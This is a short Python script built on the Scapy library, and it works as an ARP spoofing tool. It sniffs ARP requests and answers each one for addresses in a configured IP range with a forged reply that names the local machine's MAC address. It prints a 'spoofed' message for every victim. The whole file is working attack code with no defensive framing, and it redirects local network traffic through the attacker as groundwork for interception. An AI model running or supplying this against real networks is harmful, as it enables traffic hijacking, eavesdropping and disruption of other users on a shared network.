#! /usr/bin/python
'''Scapy Hack on Windows
Python27\Lib\site-packages\scapy\arch\windows\compatibility.py
# from scapy.base_classes import Gen, SetGen
# import scapy.plist as plist
# from scapy.data import MTU,ETH_P_ARP,ETH_P_ALL
# from scapy.arch.consts import LOOPBACK_NAME
# from scapy.config import conf,ConfClass
# from scapy.error import log_runtime,log_interactive
# from scapy.arch.pcapdnet import PcapTimeoutElapsed
# WINDOWS = True
'''
from scapy.all import *
from Utility import ip2int, load_json, printh

global l3sock

def arp_response(pkt):
	global ip_range, localMAC, l3sock
	t = ip2int(pkt.pdst)
	if t>=ip_range[0] and t<ip_range[1]:
		arp_res = (
			Ether(src=localMAC, dst=pkt.hwsrc)/
			ARP(
		    	op="is-at",
		    	hwsrc=localMAC,
		    	hwdst=pkt.hwsrc,
		    	#send back to the source host
		    	psrc=pkt.pdst,
		    	pdst=pkt.psrc
		    )
		)
		l3sock.send(arp_res)
		print(arp_res.pdst + " spoofed when calling " + arp_res.psrc)
	pass

def init():
	global ip_range, localMAC, l3sock
	ip_range = load_json("./config.json")['ip_range']
	ip_range = [ip2int(x) for x in ip_range]
	localMAC = get_if_hwaddr(conf.iface)
	l3sock = conf.L3socket(iface=conf.iface)
	pass

if __name__ == '__main__':
	init()
	try:
		print("Running over %s ..."%(str(conf.iface)))
		sniff(filter="arp and arp[7] = 1", prn=arp_response)
	except Exception as e:
		printh('ARP Spoof', e, 'red')
	finally:
		l3sock.close()
